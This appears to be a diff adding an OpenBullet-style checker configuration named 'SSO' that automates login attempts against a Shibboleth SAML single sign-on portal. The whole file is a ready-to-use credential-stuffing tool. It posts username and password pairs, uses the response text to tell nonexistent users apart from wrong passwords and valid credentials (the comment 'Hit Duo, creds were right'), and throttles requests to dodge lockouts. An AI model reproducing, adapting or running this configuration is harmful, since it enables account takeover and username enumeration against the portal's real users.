@@ -1,0 +1,80 @@
+[SETTINGS]
+{
+  "Name": "SSO",
+  "SuggestedBots": 5,
+  "MaxCPM": 15,
+  "LastModified": "2022-06-06T00:26:22.5911876-07:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": true,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://my.[WEBSITE]/Portal/Dashboard/" 
+  
+  HEADER "Sec-Ch-Ua: \"Chromium\";v=\"97\", \" Not;A Brand\";v=\"99\"" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36" 
+
+REQUEST POST "https://shibboleth.[WEBSITE]/idp/profile/SAML2/Redirect/SSO?execution=e1s1" 
+  CONTENT "j_username=<USER>&j_password=<PASSWORD>&_eventId_proceed=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The username you entered cannot be identified."  ## User with username does not exist
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "The password you entered was incorrect." ## Account exists, password is wrong 
+  KEYCHAIN Success OR 
+    KEY "My Settings &amp; Devices" ## Hit Duo, creds were right
+  KEYCHAIN Retry OR 
+    KEY "LDAPException" ## Server is overloaded
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Account Locked"
+
+FUNCTION Delay "30000" 
